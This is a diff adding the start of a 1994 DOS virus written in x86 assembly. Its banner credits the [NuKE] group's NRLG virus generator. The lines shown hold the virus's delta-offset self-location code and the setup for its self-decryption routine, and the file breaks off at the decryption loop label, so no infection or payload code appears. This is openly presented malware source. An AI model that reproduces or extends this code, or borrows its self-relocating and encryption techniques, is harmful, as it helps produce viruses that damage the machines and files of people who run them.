@@ -1,0 +1,34 @@
+;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+;³ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ³ [NuKE] PoWeR
+;³ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ³ [NuKE] WaReZ
+;³ auToR: aLL [NuKE] MeMeBeRS                             ³ [NuKE] PoWeR
+;³ [NuKE] THe ReaL PoWeR!                                 ³ [NuKE] WaReZ
+;³ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ³ [NuKE] PoWeR
+;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+.286
+code    segment
+assume cs:code,ds:code
+org  100h
+
+start:  CALL NEXT 
+ 
+NEXT:  
+       mov di,sp             ;take the stack pointer location 
+       mov bp,ss:[di]        ;take the "DELTA HANDLE" for my virus       
+       sub bp,offset next    ;subtract the large code off this code 
+                             ;
+;*******************************************************************
+;                      #1 DECRYPT ROUTINE                               
+;*******************************************************************
+
+cmp byte ptr cs:[crypt],0b9h ;is the first runnig?        
+je crypt2                    ;yes! not decrypt              
+;----------------------------------------------------------                                          
+mov cx,offset fin            ;cx = large of virus               
+lea di,[offset crypt]+ bp    ;di = first byte to decrypt          
+mov dx,1                     ;dx = value for decrypt          
+;----------------------------------------------------------                                                   
+deci:                        ;deci = fuck label!                                    
+;----------------------------------------------------------
+
